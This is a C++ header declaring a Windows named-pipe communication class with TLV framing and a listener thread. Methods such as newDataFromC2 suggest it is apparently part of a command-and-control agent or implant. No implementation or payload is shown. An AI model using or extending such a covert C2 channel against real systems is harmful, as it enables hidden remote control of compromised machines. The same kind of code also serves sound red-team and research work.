#pragma once
#include <winsock2.h>
#include <windows.h>
#include <atomic>
#include <string>
#include <vector>
#include <map>
#include <functional>
#include "TLV.h"
#include "RaiiHelpers.h"

class CommunicationNamedPipes
{
private:
    std::atomic<bool> active{false};
    HANDLE hPipe = INVALID_HANDLE_VALUE;
    HANDLE listenThread = nullptr;
    HANDLE shutdownEvent = nullptr;
    DWORD listenThreadId = 0;
    int seqNr = 1;
    std::map<int, TLVPtr> responses;
    std::map<int, HANDLE> signals;
    CRITICAL_SECTION csResponses;
    CRITICAL_SECTION csWrite;
    std::string pipePath;
    std::function<void(const std::vector<byte>&)> callback;

    bool readExact(BYTE* buf, DWORD len, int timeoutMs = 10000);
    std::vector<byte> getData(bool initialFrame = false);
    void requestStop() noexcept;
    void listenForMessages();
    std::vector<byte> waitForResponseData(int id);
    std::vector<byte> sendRequestAndWait(UINT8 messageType);

    static DWORD WINAPI listenThreadProc(LPVOID param);

public:
    CommunicationNamedPipes(const std::string& name, std::function<void(const std::vector<byte>&)> callbackIn);
    ~CommunicationNamedPipes();

    CommunicationNamedPipes(const CommunicationNamedPipes&) = delete;
    CommunicationNamedPipes& operator=(const CommunicationNamedPipes&) = delete;

    void setCallback(std::function<void(const std::vector<byte>&)> callbackIn);
    std::vector<byte> connect();
    bool putData(const std::vector<byte>& data);
    void close() noexcept;
    bool isConnected() const noexcept { return active.load(); }
    std::vector<byte> getMetadata();
    std::vector<byte> getDataToSend();
    bool newDataFromC2(const std::vector<byte>& data);
};
